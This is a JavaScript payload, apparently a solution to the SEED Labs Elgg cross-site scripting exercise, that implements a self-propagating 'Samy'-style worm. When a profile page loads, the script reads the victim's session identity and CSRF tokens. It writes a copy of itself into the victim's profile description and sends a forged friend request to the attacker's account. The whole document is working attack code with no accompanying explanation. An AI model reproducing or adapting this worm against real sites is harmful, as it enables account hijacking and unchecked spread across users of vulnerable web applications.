<script id="worm" type="text/javascript">
window.onload = function () {
    var userName = "&name=" + elgg.session.user.name;
    var guid = "&guid=" + elgg.session.user.guid;
    var ts = "&__elgg_ts=" + elgg.security.token.__elgg_ts;
    var token = "&__elgg_token=" + elgg.security.token.__elgg_token;

    // Get a copy of the worm
    var headerTag = "<script id=\"worm\" type=\"text/javascript\">";
    var jsCode = document.getElementById("worm").innerHTML;
    var tailTag = "</" + "script>";
    var wormCode = encodeURIComponent(headerTag + jsCode + tailTag);

    // Craft the new description to include the worm
    var description = "&description=I have been hacked by Samy.<br>" + wormCode;

    var content = token + ts + userName + description + guid;
    var samyGuid = 59;
    var sendurl = "http://www.seed-server.com/action/profile/edit";

    if (elgg.session.user.guid != samyGuid) {
        // Send the request to update the victim's profile
        var Ajax = new XMLHttpRequest();
        Ajax.open("POST", sendurl, true);
        Ajax.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
        Ajax.send(content);

        // Send a request to add Samy as a friend
        var friendRequest = new XMLHttpRequest();
        var addFriendUrl = "http://www.seed-server.com/action/friends/add" + "?friend=56" + token + ts; 
        friendRequest.open("GET", addFriendUrl, true);
        friendRequest.send();
    }
}
</script>
